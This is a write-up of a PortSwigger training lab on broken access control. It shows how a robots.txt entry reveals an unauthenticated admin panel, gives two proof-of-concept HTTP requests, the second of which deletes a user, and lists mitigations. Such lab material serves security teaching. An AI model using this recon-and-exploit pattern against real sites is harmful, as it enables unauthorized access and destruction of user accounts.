# Unprotected admin functionality
---
## TARGET
PortSwigger Web Security Academy  
Lab: _Unprotected admin functionality_
Vulnerability: _Broken Access Control (Information Disclosure via robots.txt)_

---
## DESCRIPTION
The application hosts an administrative panel that is not protected by any authentication mechanism. The security relies entirely on "Security by Obscurity." However, the path to this panel is explicitly listed in the `robots.txt` file, allowing unauthorized discovery and access.

---
## ROOT CAUSE
**Information Disclosure & Lack of Authorization:** The `robots.txt` file leaks the sensitive directory path (`/administrator-panel`), and the application fails to enforce access control checks on that endpoint.

---
## ATTACK SCENARIO
1. **Reconnaissance:** Attacker checks `/robots.txt` and finds `Disallow: /administrator-panel`.
2. **Exploitation:** Attacker navigates to the admin panel and triggers the delete function for user `carlos`.

---
## PROOF OF CONCEPT
### RECON REQUEST
```http
GET /robots.txt HTTP/1.1
```
### EXPLOIT REQUEST
```http
GET /administrator-panel/delete?username=carlos HTTP/1.1
```

---
## IMPACT
**Critical:** Complete compromise of administrative functionality, allowing unauthenticated user deletion.

---
## FIX / MITIGATION
- Remove sensitive paths from public files like `robots.txt`.
- Enforce strict authentication and authorization on all admin endpoints.

---
## KEY LEARNING
**Robots.txt is a Roadmap.** Never hide secret URLs in public files. If a crawler can see it, an attacker can see it.

---
